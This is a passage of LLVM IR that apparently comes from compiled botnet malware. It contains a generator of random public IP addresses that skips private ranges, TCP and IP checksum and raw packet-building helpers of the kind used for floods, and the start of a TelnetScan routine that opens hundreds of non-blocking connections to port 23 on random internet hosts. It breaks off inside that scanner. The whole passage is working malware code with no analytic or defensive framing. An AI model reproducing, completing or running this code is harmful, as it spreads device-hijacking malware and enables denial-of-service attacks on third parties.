  br i1 %84, label %169, label %85

; <label>:85:                                     ; preds = %81, %77
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 172
  br i1 %88, label %89, label %97

; <label>:89:                                     ; preds = %85
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sle i32 %91, 16
  br i1 %92, label %93, label %97

; <label>:93:                                     ; preds = %89
  %94 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %95 = zext i8 %94 to i32
  %96 = icmp sle i32 %95, 31
  br i1 %96, label %169, label %97

; <label>:97:                                     ; preds = %93, %89, %85
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 192
  br i1 %100, label %101, label %109

; <label>:101:                                    ; preds = %97
  %102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %109

; <label>:105:                                    ; preds = %101
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 2
  br i1 %108, label %169, label %109

; <label>:109:                                    ; preds = %105, %101, %97
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 192
  br i1 %112, label %113, label %121

; <label>:113:                                    ; preds = %109
  %114 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 88
  br i1 %116, label %117, label %121

; <label>:117:                                    ; preds = %113
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 99
  br i1 %120, label %169, label %121

; <label>:121:                                    ; preds = %117, %113, %109
  %122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 192
  br i1 %124, label %125, label %129

; <label>:125:                                    ; preds = %121
  %126 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 168
  br i1 %128, label %169, label %129

; <label>:129:                                    ; preds = %125, %121
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 198
  br i1 %132, label %133, label %141

; <label>:133:                                    ; preds = %129
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 18
  br i1 %136, label %169, label %137

; <label>:137:                                    ; preds = %133
  %138 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 19
  br i1 %140, label %169, label %141

; <label>:141:                                    ; preds = %137, %129
  %142 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 198
  br i1 %144, label %145, label %153

; <label>:145:                                    ; preds = %141
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 51
  br i1 %148, label %149, label %153

; <label>:149:                                    ; preds = %145
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 100
  br i1 %152, label %169, label %153

; <label>:153:                                    ; preds = %149, %145, %141
  %154 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 203
  br i1 %156, label %157, label %165

; <label>:157:                                    ; preds = %153
  %158 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 0
  br i1 %160, label %161, label %165

; <label>:161:                                    ; preds = %157
  %162 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 113
  br i1 %164, label %169, label %165

; <label>:165:                                    ; preds = %161, %157, %153
  %166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %167 = zext i8 %166 to i32
  %168 = icmp sge i32 %167, 224
  br label %169

; <label>:169:                                    ; preds = %165, %161, %149, %137, %133, %125, %117, %105, %93, %81, %73, %69, %57, %53
  %170 = phi i1 [ true, %161 ], [ true, %149 ], [ true, %137 ], [ true, %133 ], [ true, %125 ], [ true, %117 ], [ true, %105 ], [ true, %93 ], [ true, %81 ], [ true, %73 ], [ true, %69 ], [ true, %57 ], [ true, %53 ], [ %168, %165 ]
  br i1 %170, label %171, label %184

; <label>:171:                                    ; preds = %169
  %172 = call i32 @rand() #2
  %173 = srem i32 %172, 255
  %174 = trunc i32 %173 to i8
  store i8 %174, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %175 = call i32 @rand() #2
  %176 = srem i32 %175, 255
  %177 = trunc i32 %176 to i8
  store i8 %177, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %178 = call i32 @rand() #2
  %179 = srem i32 %178, 255
  %180 = trunc i32 %179 to i8
  store i8 %180, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %181 = call i32 @rand() #2
  %182 = srem i32 %181, 255
  %183 = trunc i32 %182 to i8
  store i8 %183, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %53

; <label>:184:                                    ; preds = %169
  %185 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %186 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %187 = zext i8 %186 to i32
  %188 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %189 = zext i8 %188 to i32
  %190 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %191 = zext i8 %190 to i32
  %192 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %193 = zext i8 %192 to i32
  %194 = call i32 (i8*, i8*, ...) @szprintf(i8* %185, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %187, i32 %189, i32 %191, i32 %193)
  %195 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %196 = call i32 @inet_addr(i8* %195) #2
  store i32 %196, i32* %1, align 4
  br label %197

; <label>:197:                                    ; preds = %184, %19
  %198 = load i32, i32* %1, align 4
  ret i32 %198
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %59

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %2, align 4
  br label %37

; <label>:59:                                     ; preds = %37
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 8, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %61, align 8
  br label %62

; <label>:62:                                     ; preds = %2050, %59
  br label %63

; <label>:63:                                     ; preds = %62
  store i32 0, i32* %2, align 4
  br label %64

; <label>:64:                                     ; preds = %2047, %63
  %65 = load i32, i32* %2, align 4
  %66 = load i32, i32* %1, align 4
  %67 = icmp slt i32 %65, %66
  br i1 %67, label %68, label %2050

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* %2, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %70
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = zext i8 %73 to i32
  switch i32 %74, label %2046 [
    i32 0, label %75
    i32 1, label %218
    i32 2, label %374
    i32 3, label %663
    i32 4, label %731
    i32 5, label %1075
    i32 6, label %1143
    i32 7, label %1952
    i32 8, label %1980
  ]

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* %2, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %77
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %78, i32 0, i32 8
  %80 = load i8*, i8** %79, align 8
  call void @llvm.memset.p0i8.i64(i8* %80, i8 0, i64 1024, i32 1, i1 false)
  %81 = load i32, i32* %2, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %82
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %83, i32 0, i32 3
  %85 = load i8, i8* %84, align 1
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %87, label %107

; <label>:87:                                     ; preds = %75
  %88 = load i32, i32* %2, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %89
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %90, i32 0, i32 8
  %92 = load i8*, i8** %91, align 8
  store i8* %92, i8** %11, align 8
  %93 = load i32, i32* %2, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %94
  %96 = bitcast %struct.telstate_t* %95 to i8*
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 32, i32 16, i1 false)
  %97 = load i8*, i8** %11, align 8
  %98 = load i32, i32* %2, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %99
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %100, i32 0, i32 8
  store i8* %97, i8** %101, align 8
  %102 = call i32 @getRandomPublicIP()
  %103 = load i32, i32* %2, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 1
  store i32 %102, i32* %106, align 4
  br label %146

; <label>:107:                                    ; preds = %75
  %108 = load i32, i32* %2, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 5
  %112 = load i8, i8* %111, align 1
  %113 = add i8 %112, 1
  store i8 %113, i8* %111, align 1
  %114 = load i32, i32* %2, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %115
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %116, i32 0, i32 5
  %118 = load i8, i8* %117, align 1
  %119 = zext i8 %118 to i64
  %120 = icmp eq i64 %119, 18
  br i1 %120, label %121, label %132

; <label>:121:                                    ; preds = %107
  %122 = load i32, i32* %2, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 5
  store i8 0, i8* %125, align 1
  %126 = load i32, i32* %2, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 4
  %130 = load i8, i8* %129, align 2
  %131 = add i8 %130, 1
  store i8 %131, i8* %129, align 2
  br label %132

; <label>:132:                                    ; preds = %121, %107
  %133 = load i32, i32* %2, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %134
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %135, i32 0, i32 4
  %137 = load i8, i8* %136, align 2
  %138 = zext i8 %137 to i64
  %139 = icmp eq i64 %138, 10
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %132
  %141 = load i32, i32* %2, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 3
  store i8 1, i8* %144, align 1
  br label %2047

; <label>:145:                                    ; preds = %132
  br label %146

; <label>:146:                                    ; preds = %145, %87
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %147, align 4
  %148 = call zeroext i16 @htons(i16 zeroext 23) #13
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %148, i16* %149, align 2
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %151 = getelementptr inbounds [8 x i8], [8 x i8]* %150, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %151, i8 0, i64 8, i32 4, i1 false)
  %152 = load i32, i32* %2, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 1
  %156 = load i32, i32* %155, align 4
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %158 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %157, i32 0, i32 0
  store i32 %156, i32* %158, align 4
  %159 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %160 = load i32, i32* %2, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 0
  store i32 %159, i32* %163, align 16
  %164 = load i32, i32* %2, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %165
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 16
  %169 = icmp eq i32 %168, -1
  br i1 %169, label %170, label %171

; <label>:170:                                    ; preds = %146
  br label %2047

; <label>:171:                                    ; preds = %146
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 16
  %177 = load i32, i32* %2, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %178
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %179, i32 0, i32 0
  %181 = load i32, i32* %180, align 16
  %182 = call i32 (i32, i32, ...) @fcntl(i32 %181, i32 3, i8* null)
  %183 = or i32 %182, 2048
  %184 = call i32 (i32, i32, ...) @fcntl(i32 %176, i32 4, i32 %183)
  %185 = load i32, i32* %2, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 16
  %190 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
